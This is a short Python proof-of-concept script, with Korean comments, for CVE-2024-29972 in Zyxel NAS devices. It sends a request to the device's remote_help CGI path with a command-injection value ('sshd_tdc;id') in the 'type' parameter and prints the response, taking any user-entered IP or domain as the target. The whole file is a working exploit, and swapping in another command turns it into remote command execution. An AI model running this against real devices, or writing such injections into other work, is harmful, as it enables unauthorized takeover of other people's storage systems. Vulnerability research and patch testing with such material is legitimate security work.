# SPDX-FileCopyrightText: © 2024 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_cve_2024_29972_direct(target_ip):
    """
    Zyxel NAS 취약점 (CVE-2024-29972) 직접 경로 테스트 PoC
    :param target_ip: 테스트할 대상 IP 또는 도메인
    """
    url = f"http://{target_ip}/cgi-bin/remote_help-cgi/"
    
    payload = {
        "type": "sshd_tdc;id"
    }

    try:
        print(f"[+] {url} 경로에 명령 인젝션 테스트 요청 전송 중...")
        response = requests.get(url, params=payload, timeout=10)

        print("[+] 응답 코드:", response.status_code)
        print("[+] 응답 내용 일부:")
        print(response.text[:500])

    except requests.exceptions.RequestException as e:
        print("[!] 요청 실패:", e)

if __name__ == "__main__":
    target = input("Zyxel NAS 대상 IP 또는 도메인을 입력하세요 >> ").strip()
    test_cve_2024_29972_direct(target)
